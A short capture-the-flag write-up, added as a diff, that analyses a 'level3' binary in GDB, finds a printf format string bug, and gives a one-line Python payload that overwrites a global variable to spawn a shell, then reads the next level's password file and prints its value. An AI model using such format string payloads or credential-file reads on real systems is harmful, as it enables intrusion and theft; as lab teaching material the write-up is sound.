@@ -1,0 +1,18 @@
+Step 1: Analyze binary with GDB
+$ gdb ./level3
+(gdb) info functions        # Found v(), main(), printf(), system()
+(gdb) disassemble v         # Found format string vulnerability
+
+Step 2: Identify the vulnerability
+- printf(user_input) at 0x080484d5 - format string bug
+- Global variable at 0x804988c compared with 0x40
+- If equal, system("/bin/sh") is called
+
+Step 3: Create format string exploit
+$ (python -c 'print "\x8c\x98\x04\x08" + "%60u%4$n"'; cat) | ./level3
+
+Step 4: Got shell and retrieved password
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
